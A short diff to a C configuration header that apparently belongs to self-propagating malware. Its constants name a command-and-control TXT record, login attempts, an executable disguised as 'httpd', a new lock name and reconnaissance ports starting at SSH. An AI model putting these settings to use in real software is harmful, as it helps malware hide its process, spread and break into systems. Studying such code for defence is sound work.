@@ -2,6 +2,7 @@
 #define PRNE_CNC_TXT_REC 		"CHANGE.ME.test"
 #define PRNE_BNE_LOGIN_ATTEMPT	0
 #define PRNE_BNE_EXEC_NAME		"httpd"
+#define PRNE_BNE_LOCK_NAME		"CHANGE ME"
 
 #define PRNE_RCN_PORTS {\
 	/* 22 */		0x00, 0x16,\
